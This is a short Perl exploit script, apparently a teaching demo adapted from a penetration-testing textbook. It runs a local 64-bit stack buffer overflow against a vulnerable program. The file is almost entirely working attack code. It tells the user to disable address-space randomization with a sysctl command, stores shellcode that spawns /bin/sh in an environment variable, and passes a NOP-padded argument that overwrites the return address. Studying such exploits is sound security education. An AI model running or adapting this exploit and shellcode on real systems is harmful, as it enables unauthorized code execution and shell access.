#!/usr/bin/perl
#  By Fanping Zeng, 12/6, 2014.
#  Modified from 《网络渗透技术》演示程序(作者：san, alert7, eyas, watercloud)
#  First, you should turn off memory randomization by set kernel.randomize_va_space to 0.
#   Do the command: sudo sysctl -w kernel.randomize_va_space=0
#  exploit64.pl
#  exploit program vulnerable

$shellcode="\x48\x31\xdb\x48\x31\xd2\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68".
"\x52\x50\x48\x89\xe7\x52\x57\x48\x89\xe1\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05";

$path="abcdef";

$ret = 0x7fffffffeff8 - (length($path)+1) - (length($shellcode)+1);

#$new_retword = pack('l!', $ret); # covert the jump address to a string.
$new_retword = pack('q', $ret); # covert the 64 bits jump address to a 64 bits string.

printf("[+] Using ret shellcode 0x%x\n",$ret);

$nops="\x90\x90\x90\x90\x90\x90\x90\x90"; # 8 NOPs

%ENV=(); $ENV{CC}=$shellcode;

$argv=$nops.$nops.$nops.$new_retword;

printf("[+] Using ret shellcode 0x%x\n",$ret);

exec "$path",$argv;

